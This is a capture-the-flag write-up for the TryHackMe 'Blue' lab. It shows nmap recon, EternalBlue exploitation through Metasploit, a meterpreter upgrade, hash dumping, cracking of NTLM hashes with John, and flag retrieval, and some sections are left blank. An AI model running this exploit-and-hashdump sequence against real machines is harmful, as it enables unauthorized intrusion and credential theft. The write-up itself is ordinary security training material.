# Blue
#### Hack into a Windows machine, leveraging common misconfigurations issues.
#### [Room Link](1)

## Tasks
1. Deploy the Machine and connect to our network
2. Recon
  Run nmap scan `nmap -sV -sC -Pn -oN blue_nmap.txt 10.10.125.90` and get the outputs
  ```
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 11:00 EDT
Nmap scan report for 10.10.125.90
Host is up (0.13s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-03-19T15:01:49+00:00; +1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 1s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:12:54:7c:8d:b8 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-03-19T10:01:44-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-19T15:01:44
|_  start_date: 2020-03-19T14:56:37
  ```
  2. How many ports are open with a port number under 1000?
    3
  3. What is this machine vulnerable to?
    MS17-010 (EternalBlue)
3. Task #2 Gain access
  1. Boot Metasploit
    `msfconsole` takes a bit to load.
    `search blue` find the correct EternalBlue exploit
    `use exploit/windows/smb/ms17_010_eternalblue`
    use `show options` to see what is needed
    `set [RHOST]` with the the room ip and then `exploit` when ready.
    It should show the cmd prompt after a bit. from there we want to upgrade to a
    meterpreter shell. We can do that by backgrounding the current shell with `ctrl+z` then searching for `post/multi/manage/shell_to_meterpreter` so we can use it with
    `use post/multi/manage/shell_to_meterpreter`
    see which session the DOS prompt is with `sessions -l` then set the sessions With
    `set SESSION [session#]` then `exploit`. If it doesnt work the first time, see if you can re-exploit with the EternalBlue module then try to upgrade the shell again.
    After getting the meterpreter shell module complete you can see its session with `session -l `again and take control of it with `session -i [meterpreterID]`.

    After restarting the exploit and meterpreter shell over a couple of times we are able to see an elevated process to authenticate to with `ps` in the meterpreter shell with `migrate [pID]`.

    After elevating we can hashdump with `hashdump` in the elevated meterpreter shell and
    save those on our local machine. Here are those hashes
    ```
    Administrator:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:ffb43f0de35be4d9917ac0cc8ad57f8d:::
    ```
    BUt we also can use the built in hashdump module in Metasploit with `use post/windows/gather/hashdump` set the correct.
     knowing that Metasploit gives us the hashes in [User]:[SecurityID]:[LMHASH]:[NTLMHASH]
     we can manually strip the users to
     `[User]:[NTLMHASH]:::`
     then use John to crack it with the `rockyou.txt` files
     `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt blue_ntlm.txt`
     John may take a bit to run, but we were able to get `alqfna22    (Jon)`
     which completes our tasks

     ![crackedhashes](2)
    finding the flags
     flag 1:
     ```
     meterpreter > shell
cProcess 1308 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32  

C:\Windows\system32>cd
cd
C:\Windows\system32

C:\Windows\system32>cd \
cd \

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
03/17/2019  05:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  22,833,348,608 bytes free

C:\>cat flag1.txt
cat flag1.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}
C:\>

     ```
     Flag 2:
     ```

     ```

     Flag3:
     ```
     C:\Users>cd Jon
cd Jon

C:\Users\Jon>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon

12/12/2018  10:13 PM    <DIR>          .
12/12/2018  10:13 PM    <DIR>          ..
12/12/2018  10:13 PM    <DIR>          Contacts
12/12/2018  10:49 PM    <DIR>          Desktop
12/12/2018  10:49 PM    <DIR>          Documents
12/12/2018  10:13 PM    <DIR>          Downloads
12/12/2018  10:13 PM    <DIR>          Favorites
12/12/2018  10:13 PM    <DIR>          Links
12/12/2018  10:13 PM    <DIR>          Music
12/12/2018  10:13 PM    <DIR>          Pictures
12/12/2018  10:13 PM    <DIR>          Saved Games
12/12/2018  10:13 PM    <DIR>          Searches
12/12/2018  10:13 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  22,833,348,608 bytes free

C:\Users\Jon>cd Documents
cd Documents

C:\Users\Jon\Documents>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

12/12/2018  10:49 PM    <DIR>          .
12/12/2018  10:49 PM    <DIR>          ..
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  22,833,348,608 bytes free

C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
C:\Users\Jon\Documents>
     ```
4. Sample
5. Sample

## Review

For links
[1]:https://tryhackme.com/room/blue
[2]:./resources/blue_hashcracked.png
[3]:
[4]:
[5]:
